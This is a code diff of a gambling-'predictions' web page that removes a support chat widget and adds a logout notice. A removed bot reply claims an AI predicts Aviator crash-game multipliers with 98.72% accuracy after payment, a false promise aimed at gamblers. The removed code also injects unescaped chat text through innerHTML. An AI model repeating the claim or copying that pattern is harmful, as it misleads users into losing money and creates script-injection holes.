-                response = "Our AI analyzes flight patterns and provides multiplier predictions. After payment verification, you'll receive real-time predictions for your selected package duration. Our accuracy rate is 98.72%!";
-            } else {
-                response = "Thank you for contacting support! I've forwarded your message to our admin team. They'll respond shortly with assistance.";
-            }
-            
-            setTimeout(() => {
-                addMessageToChat(response, 'bot');
-            }, 500);
-        }
-
-        // Admin reply polling system for bot.html
-        let adminReplyPollInterval = null;
-        
-        // Enhanced chat session ID generation for bot
-        function generateBotChatSessionId() {
-            if (!chatSessionId) {
-                const userEmail = sessionStorage.getItem('aviator_contact') || 'bot_user';
-                const timestamp = Date.now();
-                const randomId = Math.random().toString(36).substr(2, 9);
-                chatSessionId = `BOT_CHAT_${userEmail.split('@')[0]}_${timestamp}_${randomId}`;
-                console.log('Generated bot chat session ID:', chatSessionId);
-                
-                // Check for pending replies when session starts
-                checkForBotPendingReplies(userEmail);
-            }
-            return chatSessionId;
-        }
-        
-        // Check for pending replies when bot chat opens
-        async function checkForBotPendingReplies(customerEmail) {
-            try {
-                const response = await fetch(`${API_BASE_URL}/api/chat/pending-replies/${customerEmail}`, {
-                    method: 'GET',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    }
-                });
-                
-                if (response.ok) {
-                    const result = await response.json();
-                    if (result.hasPendingReply && result.reply) {
-                        // Show the pending reply in bot chat
-                        addMessageToChat(result.reply.message, 'bot', result.reply.adminName);
-                        console.log('Delivered pending reply to bot customer');
-                    }
-                }
-            } catch (error) {
-                console.error('Error checking for bot pending replies:', error);
-            }
-        }
-        
-        // Send customer message to chat API for bot
-        async function sendBotMessageToChatAPI(message, userEmail) {
-            try {
-                const sessionId = generateBotChatSessionId();
-                const response = await fetch(`${API_BASE_URL}/api/chat/${sessionId}/message`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify({
-                        message: message,
-                        customerEmail: userEmail,
-                        customerName: 'Bot Page Customer'
-                    })
-                });
-                
-                if (response.ok) {
-                    console.log('Bot message sent to chat API successfully');
-                } else {
-                    console.log('Failed to send bot message to chat API');
-                }
-            } catch (error) {
-                console.error('Error sending bot message to chat API:', error);
-            }
-        }
-        
-        // Poll for admin replies for bot
-        async function checkForBotAdminReplies() {
-            if (!chatSessionId) return;
-            
-            try {
-                const response = await fetch(`${API_BASE_URL}/api/chat/${chatSessionId}/latest-reply`, {
-                    method: 'GET',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    }
-                });
-                
-                if (response.ok) {
-                    const result = await response.json();
-                    if (result.hasReply && result.reply) {
-                        // Remove typing indicator if it exists
-                        const typingIndicator = document.getElementById('typing-indicator-msg');
-                        if (typingIndicator) {
-                            typingIndicator.remove();
-                        }
-                        
-                        // Show admin reply in bot chat
-                        addMessageToChat(result.reply.text, 'bot', result.reply.sender);
-                        
-                        // Show notification if chat is closed
-                        if (!chatOpen) {
-                            showUnreadBadge();
-                        }
-                    }
-                }
-            } catch (error) {
-                console.error('Error checking for bot admin replies:', error);
-            }
-        }
-        
-        // Start admin reply polling for bot
-        function startBotAdminReplyPolling() {
-            if (!adminReplyPollInterval) {
-                // Check immediately
-                checkForBotAdminReplies();
-                // Then check every 3 seconds
-                adminReplyPollInterval = setInterval(checkForBotAdminReplies, 3000);
-                console.log('Started bot admin reply polling');
-            }
-        }
-        
-        // Stop admin reply polling for bot
-        function stopBotAdminReplyPolling() {
-            if (adminReplyPollInterval) {
-                clearInterval(adminReplyPollInterval);
-                adminReplyPollInterval = null;
-                console.log('Stopped bot admin reply polling');
-            }
-        }
-        
-        // Enhanced message functions to integrate with chat API
-        const originalSendMessageToAdmin = sendMessageToAdmin;
-        sendMessageToAdmin = async function(message) {
-            const userEmail = sessionStorage.getItem('aviator_contact') || 'bot_user@unknown.com';
-            
-            // Send to chat API for admin replies
-            await sendBotMessageToChatAPI(message, userEmail);
-            
-            // Start polling for admin replies
-            startBotAdminReplyPolling();
-            
-            // Call original function for Telegram
-            return originalSendMessageToAdmin(message);
-        };
-        
-        // Enhanced toggle function
-        const originalToggleSupportChat = toggleSupportChat;
-        toggleSupportChat = function() {
-            const result = originalToggleSupportChat();
-            
-            if (chatOpen) {
-                // Generate session ID and start polling when opened
-                generateBotChatSessionId();
-                startBotAdminReplyPolling();
-            } else {
-                // Reduce polling frequency when closed
-                if (adminReplyPollInterval) {
-                    clearInterval(adminReplyPollInterval);
-                    adminReplyPollInterval = setInterval(checkForBotAdminReplies, 10000); // Check every 10 seconds when closed
-                }
-            }
-            
-            return result;
-        };
-        
-        // Enhanced addMessageToChat to support admin sender names
-        const originalAddMessageToChat = addMessageToChat;
-        addMessageToChat = function(message, sender, senderName = null) {
-            if (sender === 'bot' && senderName && senderName !== 'Support Team') {
-                // If it's an admin reply with a custom sender name, show it
-                const messagesContainer = document.getElementById('chat-messages');
-                const messageDiv = document.createElement('div');
-                messageDiv.className = 'message bot-message';
-                
-                messageDiv.innerHTML = `
-                    <div class="message-avatar">👨‍💼</div>
-                    <div class="message-content">
-                        <div class="message-sender">${senderName}</div>
-                        <div class="message-text">${message}</div>
-                        <div class="message-time">${new Date().toLocaleTimeString()}</div>
+                // Show logout message
+                const logoutMsg = document.createElement('div');
+                logoutMsg.style.cssText = `
+                    position: fixed;
+                    top: 20px;
+                    right: 20px;
+                    background: #dc3545;
+                    color: white;
+                    padding: 15px 20px;
+                    border-radius: 8px;
+                    z-index: 10000;
+                    font-size: 14px;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+                `;
+                logoutMsg.innerHTML = `
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <i class="fas fa-sign-out-alt"></i>
+                        <span>Logged out successfully!</span>
                     </div>
                 `;
+                document.body.appendChild(logoutMsg);
                 
-                messagesContainer.appendChild(messageDiv);
-                messagesContainer.scrollTop = messagesContainer.scrollHeight;
-            } else {
-                // Use original function for regular messages
-                return originalAddMessageToChat(message, sender);
-            }
-        };
-        
-        // Add notification function for bot
-        function showUnreadBadge() {
-            const badge = document.getElementById('chat-badge');
-            if (badge) {
-                badge.style.display = 'block';
-                badge.textContent = '!';
+                // Redirect to login after 2 seconds
+                setTimeout(() => {
+                    window.location.reload();
+                }, 2000);
             }
         }
     </script>
-
-    <!-- Support Chat Widget -->
-    <div id="chat-widget" class="chat-widget">
-        <div id="chat-toggle" class="chat-toggle">
-            <i class="fas fa-comments"></i>
-            <span id="chat-badge" class="chat-badge" style="display: none;">1</span>
-        </div>
-        
-        <div id="chat-window" class="chat-window" style="display: none;">
-            <div class="chat-header">
-                <div class="chat-title">
-                    <i class="fas fa-headset"></i>
-                    <span>Support Chat</span>
-                    <span class="chat-status" id="chat-status">Online</span>
-                </div>
-                <button id="chat-minimize" class="chat-minimize">
-                    <i class="fas fa-minus"></i>
-                </button>
-            </div>
-            
-            <div class="chat-messages" id="chat-messages">
-                <div class="chat-message bot-message">
-                    <div class="message-avatar">
-                        <i class="fas fa-robot"></i>
-                    </div>
-                    <div class="message-content">
-                        <div class="message-text">
-                            Hello! 👋 I'm here to help you with your Aviator Predictions. How can I assist you today?
-                        </div>
-                        <div class="message-time">now</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="chat-input-container">
-                <div class="chat-input-wrapper">
-                    <input type="text" id="chat-input" placeholder="Type your message..." maxlength="500">
-                    <button id="chat-send" type="button">
-                        <i class="fas fa-paper-plane"></i>
-                    </button>
-                </div>
-                <div class="chat-quick-options">
-                    <button class="quick-option" data-message="I need help with payments">💳 Payment Help</button>
-                    <button class="quick-option" data-message="How do predictions work?">🎯 How it works</button>
-                    <button class="quick-option" data-message="I haven't received my predictions">📊 Missing predictions</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Support Chat Widget -->
-    <div id="support-chat" class="support-chat-widget">
-        <div class="chat-toggle" onclick="toggleSupportChat()">
-            <i class="fas fa-comments"></i>
-            <div class="chat-badge" id="unread-badge" style="display: none;">1</div>
-        </div>
-        
-        <div class="chat-window" id="chat-window" style="display: none;">
-            <div class="chat-header">
-                <div class="chat-title">
-                    <i class="fas fa-headset"></i>
-                    <span>Live Support</span>
-                    <div class="online-status">● Online</div>
-                </div>
-                <button class="chat-close" onclick="toggleSupportChat()">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            
-            <div class="chat-messages" id="chat-messages">
-                <div class="message bot-message">
-                    <div class="message-avatar">🤖</div>
-                    <div class="message-content">
-                        <div class="message-text">Hi! I'm here to help with any questions about your Aviator predictions. How can I assist you today?</div>
-                        <div class="message-time">Just now</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="chat-input-area">
-                <div class="typing-indicator" id="typing-indicator" style="display: none;">
-                    <div class="typing-dots">
-                        <span>Support is typing</span>
-                        <div class="dots">
-                            <span></span>
-                            <span></span>
-                            <span></span>
-                        </div>
-                    </div>
-                </div>
-                <div class="chat-input-container">
-                    <input type="text" id="chat-input" placeholder="Type your message..." onkeypress="handleChatKeyPress(event)">
-                    <button id="send-button" onclick="sendChatMessage()">
-                        <i class="fas fa-paper-plane"></i>
-                    </button>
-                </div>
-                <div class="chat-quick-options">
-                    <button class="quick-option" onclick="sendQuickMessage('I need help with payments')">💳 Payment Help</button>
-                    <button class="quick-option" onclick="sendQuickMessage('How do predictions work?')">🎯 How it works</button>
-                    <button class="quick-option" onclick="sendQuickMessage('I have not received my predictions')">📊 Missing predictions</button>
-                </div>
-            </div>
-        </div>
-    </div>
 
     <!--Start of Tawk.to Script-->
     <script type="text/javascript">
